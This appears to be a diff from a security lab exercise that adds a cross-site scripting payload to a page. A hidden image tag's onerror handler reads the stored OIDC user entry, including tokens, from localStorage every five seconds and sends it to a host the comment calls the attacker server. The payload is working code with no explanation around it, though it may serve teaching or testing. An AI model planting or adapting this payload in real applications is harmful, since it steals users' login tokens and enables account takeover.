@@ -1,0 +1,10 @@
+
+
+
+//create a ping to attacker server with OIDC user info
+<img src="x" style="display:none" onerror="(function sendPing(){
+  setInterval(function(){
+    var data = window.localStorage.getItem('oidc.user:http://localhost:8080/realms/security-lab:spa-client');
+    (new Image()).src='http://localhost:3444/give/me/token?data='+encodeURIComponent(data);
+  }, 5000);
+})()">
